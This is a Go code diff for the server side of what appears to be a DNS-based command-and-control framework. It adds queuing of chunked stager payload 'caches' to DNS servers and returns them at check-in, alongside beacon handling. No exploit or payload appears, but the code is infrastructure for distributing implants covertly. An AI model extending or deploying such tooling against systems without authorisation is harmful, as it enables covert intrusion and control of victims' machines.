@@ -666,6 +666,35 @@ func (api *APIServer) handleDNSServerCheckin(w http.ResponseWriter, r *http.Requ
 		return
 	}
 
+	// Get pending stager cache tasks for this DNS server
+	pendingCaches, err := api.db.GetPendingStagerCaches(dnsServerID)
+	if err != nil {
+		fmt.Printf("[API] ⚠️  Failed to get pending caches for %s: %v\n", dnsServerID, err)
+		pendingCaches = []map[string]interface{}{} // Continue with empty list
+	}
+
+	// Build response with cache tasks
+	var cacheTasks []map[string]interface{}
+	var cacheIDs []int
+
+	for _, cache := range pendingCaches {
+		cacheTasks = append(cacheTasks, map[string]interface{}{
+			"client_binary_id": cache["client_binary_id"],
+			"total_chunks":     cache["total_chunks"],
+			"chunks":           cache["chunks"],
+		})
+		cacheIDs = append(cacheIDs, cache["id"].(int))
+	}
+
+	// Mark caches as delivered
+	if len(cacheIDs) > 0 {
+		if err := api.db.MarkStagerCacheDelivered(cacheIDs); err != nil {
+			fmt.Printf("[API] ⚠️  Failed to mark caches as delivered: %v\n", err)
+		} else {
+			fmt.Printf("[API] 📤 Sent %d cache task(s) to DNS server %s\n", len(cacheIDs), dnsServerID)
+		}
+	}
+
 	// If this is the first checkin, broadcast domain list to all beacons
 	if isFirstCheckin {
 		go func() {
@@ -697,10 +726,17 @@ func (api *APIServer) handleDNSServerCheckin(w http.ResponseWriter, r *http.Requ
 		}()
 	}
 
-	api.sendSuccess(w, "check-in recorded", map[string]interface{}{
-		"dns_server_id":    dnsServerID,
-		"timestamp":        time.Now(),
-		"is_first_checkin": isFirstCheckin,
+	// Send response with pending caches
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]interface{}{
+		"success":        true,
+		"message":        "check-in recorded",
+		"pending_caches": cacheTasks,
+		"data": map[string]interface{}{
+			"dns_server_id":    dnsServerID,
+			"timestamp":        time.Now(),
+			"is_first_checkin": isFirstCheckin,
+		},
 	})
 }
 
@@ -1378,6 +1414,15 @@ func (api *APIServer) handleStagerInit(w http.ResponseWriter, r *http.Request) {
 			fmt.Printf("[API] Failed to assign chunks: %v\n", err)
 		}
 		return
+	}
+
+	// Queue cache task for all DNS servers (they'll get it on next checkin)
+	err = api.db.QueueStagerCacheForDNSServers(clientBinaryID, dnsServerIDs)
+	if err != nil {
+		// Log but don't fail - stager will still work via on-demand caching
+		fmt.Printf("[API] ⚠️  Failed to queue cache tasks: %v\n", err)
+	} else {
+		fmt.Printf("[API] 📦 Queued stager cache for %d DNS servers\n", len(dnsServerIDs))
 	}
 
 	// Always log stager session creation (not just in debug mode)
